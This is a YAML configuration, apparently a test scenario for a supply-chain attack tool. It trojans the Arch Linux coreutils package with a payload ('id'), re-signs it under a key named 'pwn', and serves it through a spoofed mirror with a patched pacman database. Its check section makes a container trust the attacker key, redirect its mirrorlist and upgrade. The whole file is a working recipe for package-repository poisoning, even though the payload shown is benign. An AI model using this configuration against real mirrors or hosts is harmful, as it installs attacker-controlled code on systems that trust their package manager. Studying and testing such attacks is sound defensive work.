---

upstreams:
  archlinux:
    url: https://geo.mirror.pkgbuild.com/

signing_keys:
  pwn:
    type: pgp
    uids: ["pwn"]

artifacts:
  coreutils_upstream:
    url: https://geo.mirror.pkgbuild.com/core/os/x86_64/coreutils-9.1-3-x86_64.pkg.tar.zst
    sha256: 43dfb7cee3765a5e95a8ef463712f2955fdc0f8c84a2a62d053bb67b0ee7f614
  coreutils:
    type: pacman
    infect:
      artifact: coreutils_upstream
      set:
        pkgver:
          - 9.1-777
      payload: id
  coreutils_sig:
    artifact: coreutils
    sign_with: pwn

check:
  image: archlinux
  install_keys:
    - key: pwn
      cmd: "tee /tmp/pwn.pgp > /dev/null"
  cmds:
    - ["pacman-key", "--init"]
    - ["pacman-key", "--add", "/tmp/pwn.pgp"]
    - ["pacman-key", "--lsign", "pwn"]
    - 'echo "Server = http://${SH4D0WUP_BOUND_ADDR}/\$repo/os/\$arch" | tee /etc/pacman.d/mirrorlist'
    - ["pacman", "-Suy", "--noconfirm"]

routes:
  - path: "/core/os/x86_64/core.db"
    type: patch-pacman-db
    args:
      upstream: archlinux
      patch:
        - name: coreutils
          artifact: coreutils
          signature: coreutils_sig
          set:
            "%VERSION%":
              - 9.1-777
            "%FILENAME%":
              - "coreutils-9.1-777-x86_64.pkg.tar.zst"
      exclude:
        - name: amd-ucode
  - path: "/core/os/x86_64/coreutils-9.1-777-x86_64.pkg.tar.zst"
    type: static
    args:
      artifact: coreutils
  - path: "/core/os/x86_64/coreutils-9.1-777-x86_64.pkg.tar.zst.sig"
    type: static
    args:
      artifact: coreutils_sig
  - type: proxy
    args:
      upstream: archlinux
